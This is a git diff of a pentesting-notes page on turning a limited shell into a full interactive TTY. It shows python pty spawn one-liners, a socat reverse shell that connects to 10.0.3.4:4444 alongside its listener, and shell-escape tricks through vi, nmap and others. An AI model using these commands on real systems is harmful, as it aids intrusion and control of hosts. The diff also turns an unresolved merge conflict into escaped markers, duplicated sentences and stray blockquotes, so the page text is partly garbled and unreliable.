@@ -1,13 +1,17 @@
 # Full TTYs
 
-## Full TTY
+## Full TTYs
 
-Note that the shell you set in the `SHELL` variable **must** be **listed inside** _**/etc/shells**_ or `The value for the SHELL variable was not found the /etc/shells file    
-<<<<<<< HEAD
-This incident has been reported`.
-=======
-This incident has been reported`. Also note that the next snippets only work in bash. If you're in a zsh, change to a bash before obtaining the shell by running `bash`.
->>>>>>> upstream/master
+### Full TTY
+
+Note that the shell you set in the `SHELL` variable **must** be **listed inside** _**/etc/shells**_ or \`The value for the SHELL variable was not found the /etc/shells file  
+&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD
+
+## This incident has been reported\`.
+
+This incident has been reported`. Also note that the next snippets only work in bash. If you're in a zsh, change to a bash before obtaining the shell by running`bash\`.
+
+> > > > > > > upstream/master
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -27,7 +31,7 @@ socat file:`tty`,raw,echo=0 tcp-listen:4444
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 ```
 
-### **Spawn shells**
+#### **Spawn shells**
 
 * `python -c 'import pty; pty.spawn("/bin/sh")'`
 * `echo os.system('/bin/bash')`
@@ -42,7 +46,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 * vi: `:set shell=/bin/bash:shell`
 * nmap: `!sh`
 
-## No TTY
+### No TTY
 
 If for some reason you cannot obtain a full TTY you **still can interact with programs** that expects user input. In the following example, the password is passed to `sudo` to read a file:
 
